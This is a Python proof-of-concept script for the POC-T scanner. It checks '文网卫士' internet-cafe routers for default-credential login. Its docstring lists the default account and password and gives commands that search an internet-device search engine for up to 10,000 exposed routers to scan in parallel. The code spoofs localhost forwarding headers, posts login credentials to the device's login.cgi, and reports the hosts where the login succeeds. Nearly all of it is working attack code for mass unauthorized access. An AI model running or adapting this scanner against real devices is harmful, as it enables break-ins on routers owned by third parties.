# coding:utf-8

import requests
import string
import json


def poc(url):
    '''《文网卫士》路由器
    账号：wwws
    路由器密码：admin
    usage:
       python2 POC-T.py -s router-WWWS-weakpass.py -aF "server==\"HTTPD_gw 1.0\" && title==\"文网卫士全千兆多WAN智能路由器\"" --limit 10000 -t 50
      python2 POC-T.py -s router-WWWS-weakpass.py -aF "server==\"HTTPD_gw 1.0\""

      see reference: 《文网卫士》硬件版网吧监控平台安装说明https://wwwscn.com/camera/az.html
    '''
    #print(url)
    url = "http://" + url if ("//" not in url) else url

    tmp_url = url + "/wenwang/ww_login.htm"
    burp0_url = "%s/wenwang/login.cgi" % url
    TIMEOUT = 3
    #print(burp0_url)
    session = requests.session()
    # 判断是否存活
    burp_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-Remote-Addr": "127.0.0.1",  'Connection': 'close'}
    try:
        resp_alive = session.get(url, timeout=TIMEOUT, headers=burp_headers, verify=False)
        tmp_resp = session.get(tmp_url, timeout=TIMEOUT, headers=burp_headers, verify=False)
    # 登录请求
    except:
        return False
    if "wenwang" in resp_alive.text:
        burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-Remote-Addr": "127.0.0.1"}
        burp0_data = {"user": "8888888888yuyq", "password": "8888888888cbogp", "ww_loginpage": "1",     "csrfprotect": '', "Submit": r"\xe7\x99\xbb\xe5\xbd\x95",  'Connection': 'close'}
        try:
            resp_login = session.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=TIMEOUT)
            if resp_login.text.find("wenwang")  > 0 and resp_login.text.find("ww_network.htm") > 0:
                return url
            else:
                return False
        except:
            return False
    else:
        return False
